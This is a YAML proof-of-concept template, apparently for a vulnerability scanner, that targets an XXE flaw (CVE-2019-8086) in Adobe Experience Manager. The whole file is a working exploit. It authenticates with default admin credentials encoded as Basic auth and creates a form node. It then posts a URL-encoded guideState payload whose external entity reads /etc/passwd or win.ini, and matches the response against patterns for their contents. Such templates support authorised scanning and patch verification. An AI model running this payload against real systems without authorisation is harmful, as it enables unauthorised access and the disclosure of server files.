name: poc-yaml-adobe-experience-manager-cve-2019-8086-xxe
manual: true
transport: http
set:
    randstr: randomLowercase(6)
payloads:
    payloads:
        linux:
            filePath: |
                "etc/passwd"
            re: |
                "root:.*?:[0-9]*:[0-9]*:"
        win:
            filePath: |
                "C:/Windows/win.ini"
            re: |
                "for 16-bit app support"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /content/{{randstr}}
            headers:
                Authorization: Basic YWRtaW46YWRtaW4=
                Content-Type: application/x-www-form-urlencoded
            body: sling:resourceType=fd/af/components/guideContainer
        expression: response.status == 201 && response.body.bcontains(bytes(randstr))
    r1:
        request:
            cache: true
            method: POST
            path: /content/{{randstr}}.af.internalsubmit.json
            headers:
                Authorization: Basic YWRtaW46YWRtaW4=
                Content-Type: application/x-www-form-urlencoded
            body: |
                guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<%3fxml+version%3d\"1.0\"+encoding%3d\"utf-8\"%3f><!DOCTYPE+afData+[<!ENTITY+xxe+SYSTEM+\"file%3a///{{filePath}}\">]><afData>%26xxe%3b</afData>"}}}
        expression: response.status == 200 && re.bmatches(response.body)
expression: r0() && r1()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://speakerdeck.com/0ang3el/a-hackers-perspective-on-aem-applications-security?slide=15
    vulnerability:
        id: CT-82006
        level: high
